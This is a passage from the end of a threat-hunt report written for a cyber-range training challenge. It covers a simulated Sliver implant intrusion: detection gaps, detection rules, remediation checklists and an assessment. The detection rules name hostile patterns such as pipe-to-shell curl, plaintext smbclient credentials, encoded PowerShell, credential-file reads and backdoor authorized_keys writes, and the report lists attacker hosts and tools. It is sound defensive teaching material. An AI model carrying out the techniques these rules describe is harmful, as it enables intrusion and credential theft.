**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002) / [T1098.004](https://attack.mitre.org/techniques/T1098/004)

</details>

---

## 🚨 Detection Gaps & Recommendations

### 🕳️ Observed Gaps

| Gap | Impact | Recommended Fix |
|-----|--------|----------------|
| DNS query alert to a newly-registered/suspicious domain closed as false positive with thin rationale ("baseline traffic, allowlist incomplete") | Critical — this was the earliest possible detection point for the entire intrusion (104 minutes before operator return) | Require domain registration age and reputation check before closing any "suspicious domain" DNS alert as false positive; do not allow closure based on allowlist gaps alone |
| No alerting on `curl \| bash` (pipe-to-shell) execution patterns | Critical — this is the exact initial access vector and generated no alert | Alert on any shell history entry matching `curl ... \| bash` or `wget ... \| sh` patterns |
| No alerting on process re-parenting to PID 1 (systemd) for binaries executing from `/tmp` | Critical — this is how the implant daemonized and evaded session-based detection | Implement the Sigma rule from Flags 31–34 (`Image|endswith: '/helix-update'`, `ParentImage: '/sbin/init'`) generalized to any `/tmp` binary |
| No alerting on auditd watch-key triggers for credential files (`aws_creds`, `kube_creds`, `ssh_user_keys`) by daemonized/non-interactive processes | Critical — allowed systematic credential harvesting to go unnoticed for the entire 104-minute dwell window | Alert on any `LinuxSyscall_CL` event matching credential-related `AuditKey` values where `ActorUsername`/parent context indicates a non-interactive (daemonized) process |
| No alerting on programmatic writes to `authorized_keys` | Critical — permanent backdoor written without any alert | Alert on any `Syslog`/Sysmon EID 1 process creation event with `CommandLine` containing `authorized_keys`, especially from non-configuration-management processes |
| No correlation between Cloudflare-destined connections from `/tmp` binaries | High — implant's network activity blended into legitimate-looking Cloudflare traffic | Alert on any process executing from `/tmp` (or other non-standard paths) making outbound connections to major CDN ranges |
| Mixed auth failure/success pattern on `t.harris` before alerted RDP logon not correlated to the prior credential-harvesting event on GF-DEV01 | High — credential validation pattern went unflagged as a distinct signal from brute force | Build correlation rules linking recent credential-harvesting events (e.g. Flag 10/11) to subsequent mixed-outcome authentication attempts on the harvested account elsewhere in the environment |
| SSH port-forwarding from a Linux host to RDP port 3389 on a Windows host not flagged | Critical — enabled lateral movement to GF-WS01 to appear to originate from an unrelated IP | Alert on any Linux host's `sshd`/`nc`/`nc.openbsd` process making outbound connections to port 3389 |
| Burst of `\\*\IPC$\samr` access events (SAMR enumeration) against domain controller not alerted | High — domain reconnaissance from a freshly-compromised workstation went unnoticed | Alert on `>=5` EID 5145 `IPC$\samr` access events from a single source within 60 seconds |
| Plaintext domain credentials passed via `smbclient -U` flag captured in shell history but not alerted | High — full domain/user/password combination exposed and unflagged | Alert on shell history commands matching `smbclient.*-U\s+["']?\S+%\S+` |
| Operator probing own C2 infrastructure on a port distinct from initial access port (9080 vs. 22) not flagged | Medium — additional C2 listener went unidentified | Once an operator IP is identified (e.g. via SSH source), alert on and block ALL outbound connections to that IP regardless of port |

### ✅ Recommended Detection Rules

```
RULE 1 — Pipe-to-Shell Execution (Initial Access)
IF LinuxShellHistory_CL
AND Command matches regex "curl.*\|\s*(bash|sh)" 
THEN ALERT CRITICAL

RULE 2 — Process Reparenting to systemd from /tmp (Sliver Implant Pattern)
title: Sliver implant harvests credentials via process reparenting
logsource:
    product: linux
    service: auditd
detection:
    selection:
        Image|startswith: '/tmp/'
        ParentImage: '/sbin/init'
level: high

RULE 3 — Credential File Access by Daemonized Process
IF LinuxSyscall_CL
AND AuditKey in ("aws_creds", "kube_creds", "ssh_user_keys", "claude_data")
AND Ppid corresponds to a process with ParentImage == "/sbin/init" and Image|startswith == "/tmp/"
THEN ALERT CRITICAL

RULE 4 — Programmatic authorized_keys Modification
IF Syslog (Sysmon EID 1)
AND CommandLine contains "authorized_keys"
AND InitiatingProcess not in (known_config_management_tools)
THEN ALERT CRITICAL

RULE 5 — Linux Host Forwarding RDP Traffic
IF LinuxNetwork_CL or LinuxProcess_CL
AND ActingProcessName in ("sshd", "nc", "nc.openbsd")
AND DstPortNumber == 3389
THEN ALERT CRITICAL

RULE 6 — SAMR Enumeration Burst
IF Windows Security Event Log
AND EventID == 5145
AND ShareName == "IPC$"
AND RelativeTargetName contains "samr"
AND count() by SourceAddress >= 5 within 60 seconds
THEN ALERT HIGH

RULE 7 — Plaintext Domain Credential in smbclient
IF LinuxShellHistory_CL
AND Command contains "smbclient"
AND Command matches regex "-U\s+[\"']?[^\"']+%[^\"']+[\"']?"
THEN ALERT CRITICAL

RULE 8 — Encoded PowerShell Remote Execution
IF LinuxShellHistory_CL or DeviceProcessEvents
AND (Command contains "-enc" or Command contains "-EncodedCommand")
AND Command contains "Invoke-Command"
THEN ALERT CRITICAL
```

---

## 🛠️ Remediation & Containment Checklist

### 🔴 Immediate Actions (0–4 hours)

- [ ] Isolate `GF-DEV01` from the network — confirmed active Sliver implant (`helix-update`, PID 34616) still running
- [ ] Kill the running `helix-update` process (PID 34616) under controlled forensic conditions
- [ ] Remove the backdoor SSH public key (comment: `octotempest@operator`) from `/home/a.kumar/.ssh/authorized_keys`
- [ ] Reset credentials for `a.kumar`, `sancadmin`, and `t.harris`
- [ ] Rotate all AWS credentials accessible from `GF-DEV01`
- [ ] Rotate all Kubernetes/kubeconfig credentials accessible from `GF-DEV01`
- [ ] Rotate all SSH private keys present on or accessible from `GF-DEV01`
- [ ] Block `194.36.110.139` (all ports, including 22 and 9080) at firewall/DNS level
- [ ] Block `dl.abordsecurity.space` and `sync.abordsecurity.space` at DNS level
- [ ] Preserve forensic image of `GF-DEV01` before any remediation
- [ ] Notify legal and compliance teams — confirmed credential harvesting across cloud, container, and SSH key material

### 🟠 Short Term (4–24 hours)

- [ ] Remove all attacker tools from `GF-DEV01`
  - [ ] `/tmp/helix-update`
  - [ ] `/tmp/helix-sync`
  - [ ] `/tmp/hbsync.exe`
  - [ ] `/tmp/wmi_exec.py`
  - [ ] `/usr/local/bin/helix-sync`
- [ ] Remove persistence mechanisms
  - [ ] Systemd service: `helix-sync.service` (`/etc/systemd/system/helix-sync.service`) — stop, disable, and delete
  - [ ] Backdoor SSH key in `authorized_keys` (already covered above — confirm removal)
- [ ] Audit `GF-WS01` for any artifacts or persistence related to `t.harris`'s session at 23:47 UTC
- [ ] Audit `GF-DC01` for any follow-on activity beyond the SAMR enumeration observed
- [ ] Review and restore cleared/altered logs related to this incident from SIEM backup
- [ ] Confirm whether `hbsync.exe`/`helix-build-agent.exe` from `sync.abordsecurity.space` executed anywhere in the environment despite the failed WinRM attempt

### 🟡 Medium Term (1–7 days)

- [ ] Rebuild `GF-DEV01` from a clean image given confirmed active C2 implant and persistent backdoor
- [ ] Conduct full audit of all `authorized_keys` files across the Greenfield Linux estate for similar unauthorized entries
- [ ] Conduct full AD audit on `GF-DC01` — check for additional account enumeration or compromise stemming from the SAMR activity
- [ ] Review and harden firewall rules — particularly around outbound connections to Cloudflare ranges from non-standard process paths
- [ ] Enable application allowlisting on Linux endpoints to prevent execution of unsigned binaries from `/tmp` and `/usr/local/bin`
- [ ] Deploy / tune detection rules identified in this report
- [ ] Conduct credential exposure review for any service that used the harvested AWS/Kubernetes/SSH credentials during the dwell window
- [ ] Review and improve log retention and SIEM forwarding policies for `LinuxSyscall_CL`/auditd data

### 🔵 Long Term (1–4 weeks)

- [ ] Implement systemic re-validation process for closed false-positive alerts, particularly DNS/domain reputation alerts
- [ ] Deploy auditd watch rules (or equivalent) fleet-wide for credential file access (`aws_creds`, `kube_creds`, `ssh_user_keys`) with alerting on non-interactive process contexts
- [ ] Conduct purple team exercise simulating Sliver/Ligolo-style implant deployment and SSH key backdoor persistence
- [ ] Update incident response playbooks based on lessons learned, particularly around correlating "noise" alert clusters and credential validation patterns
- [ ] Brief CISO and board on findings and remediation status — confirmed credential harvesting may require breach notification depending on data classification of harvested credentials' downstream access

---

## 🧾 Final Assessment

### Risk Conclusion

This intrusion represents a high-sophistication, targeted compromise consistent with Scattered Spider (Octo Tempest/UNC3944) tradecraft. The operator achieved initial access via a single piped shell command against a developer account, deployed a Sliver C2 implant that daemonized via process reparenting to evade session-based monitoring, and used a 104-minute autonomous dwell window to systematically harvest AWS, Kubernetes, and SSH credentials. The operator then returned using harvested SSH access, established a redundant tunneling tool (Ligolo, as `helix-sync`) as persistent infrastructure, and attempted — though failed — to extend access into the Windows domain via three separate protocols.

Confidence in the evidence is high across nearly all findings — process, authentication, file, syscall, and network telemetry all corroborated each other at every major step, and the operator's own self-chosen handle (`octotempest@operator`) provided direct attribution. The primary outstanding risk at the conclusion of this hunt is that the original implant (`helix-update`) remained actively running and the `authorized_keys` backdoor remained in place — meaning the operator retained both an active foothold and a durable means of return at the time of investigation. This is an active, ongoing incident requiring immediate Incident Response containment (per Flag 27), not further investigation.

The attacker's use of Cloudflare-fronted infrastructure for both implant delivery and the failed second-stage Windows payload demonstrates an awareness of perimeter defense limitations, and the systematic, ordered nature of the lateral movement attempts (Ligolo → SMB → WinRM → WMI) — despite all failing — indicates a methodical operator working through a prepared playbook rather than improvising randomly. The fact that `t.harris`'s harvested credentials DID succeed for lateral movement to `GF-WS01` (via the SSH tunnel through `GF-DEV01`) means the domain itself has been touched, and the SAMR enumeration against `GF-DC01` suggests further domain-level reconnaissance was either completed or in progress when this investigation window ended.

### Evidence Quality Rating

| Evidence Type | Quality | Notes |
|--------------|---------|-------|
| Process execution logs | `🟢 High` | `LinuxProcess_CL — complete PID/PPID lineage reconstructed from initial access through implant daemonization` |
| Network telemetry | `🟢 High` | `LinuxNetwork_CL and Syslog (Sysmon EID 3) — corroborated via two independent sources` |
| Authentication logs | `🟢 High` | `LinuxAuth_CL — complete for sancadmin's return; t.harris's GF-WS01 auth pattern referenced via case file tickets` |
| File activity | `🟢 High` | `LinuxFile_CL and Syslog (Sysmon EID 1) — combined coverage for both file-create events and shell-redirection writes` |
| Syscall/auditd activity | `🟢 High` | `LinuxSyscall_CL — complete watch-key data for both implant self-reads and child process activity` |
| Shell history | `🟢 High` | `LinuxShellHistory_CL — complete for a.kumar's initial access and sancadmin's full session, including return codes` |

### Confidence Assessment

| Finding | Confidence |
|---------|-----------|
| Initial access vector (curl \| bash via a.kumar) | `🟢 High — confirmed by logs across two independent tables` |
| Implant daemonization and identity (Sliver, PID 34616/PPID 1) | `🟢 High — confirmed by process telemetry and Sigma rule synthesis` |
| Credential harvesting scope (AWS, Kubernetes, SSH) | `🟢 High — confirmed via auditd watch-key telemetry` |
| Backdoor SSH key and operator handle attribution | `🟢 High — confirmed via Syslog/Sysmon EID 1, direct artifact recovery` |
| Threat actor group attribution (Scattered Spider/Octo Tempest) | `🟡 Medium — strong circumstantial match (handle, TTPs) but not independently confirmed via threat intel platform` |
| Lateral movement to GF-WS01 (t.harris) | `🟢 High — confirmed via case file tickets and SSH tunnel reconstruction` |
| Lateral movement from sancadmin directly (SMB/WinRM/WMI) | `🟢 High confidence these all FAILED — confirmed via return codes` |
| Exfiltration destination/use of harvested credentials | `🔴 Low — not addressed within this hunt's window; requires follow-on investigation` |
| Current status (implant/backdoor still active) | `🟢 High — confirmed as of end of investigation window; time-sensitive` |

---

## 📎 Analyst Notes

- All evidence reproducible via KQL queries documented in each flag section
- Reading the case file first — including all nine closed false-positive alerts — surfaced the earliest detection opportunity (CLOSED-5) and the t.harris/GF-WS01 landing timestamp (CLOSED-1 through CLOSED-4) without any querying
- The distinction between `helix-update` (Sliver C2 implant) and `helix-sync` (Ligolo tunneling component) was critical throughout — conflating the two would have produced an incorrect Sigma rule (Flag 31) and an incomplete cleanup list (Flag 28)
- `claude_data` and `octotempest@operator` are telemetry field values and embedded comments respectively — not physical artifacts — and were correctly excluded from the final artifact synthesis (Flag 41)
- Return codes in `LinuxShellHistory_CL` (Flag 25) provided a fast, reliable way to confirm that an entire category of attacker activity (lateral movement from `sancadmin`) had failed, without needing to corroborate against `GF-WS01`'s own telemetry

### 📝 Lessons Learned

- **What worked well:** Starting with the case file (closed alerts, open tickets) rather than raw queries surfaced multiple flags' worth of evidence immediately and oriented the entire subsequent investigation. Cross-referencing telemetry tables (shell history vs. process vs. file vs. syscall vs. network) repeatedly proved necessary — no single table told the complete story for any phase.
- **What to do differently:** The exfiltration destination and ultimate use of the harvested AWS/Kubernetes/SSH credentials was not addressed in this hunt's window — a follow-on investigation should extend the time window and/or pivot into cloud-provider-side logs (AWS CloudTrail, Kubernetes audit logs) to determine whether harvested credentials were actually used externally.
- **New detection rules revealed:** Pipe-to-shell execution alerting, process-reparenting-to-systemd-from-/tmp (the Sigma rule built across Flags 31–34), programmatic `authorized_keys` writes, Linux-host RDP forwarding, SAMR enumeration bursts, and plaintext credentials in `smbclient` commands are all high-value additions not previously covered.
- **Log sources that were sufficient:** All telemetry sources used in this hunt (LinuxAuth_CL, LinuxShellHistory_CL, LinuxProcess_CL, LinuxSyscall_CL, LinuxNetwork_CL, LinuxFile_CL, Syslog) provided complete coverage with no apparent gaps in data collection — every gap identified in this report is an alerting/correlation gap, not a missing telemetry source.

---

*Report generated by: Michael Kirby | 2026-05 | Greenfield Estate — Threat Hunt (GF-DEV01 / GF-WS01 / GF-DC01)*
*Classification: `TLP:RED — CONFIDENTIAL` — Do not distribute without authorization*

---

*A huge thank you to Josh Madakor for building The Cyber Range and creating a community where this kind of learning is possible, and to Mohammed A — the Threat Hunt Engineer behind this challenge.*
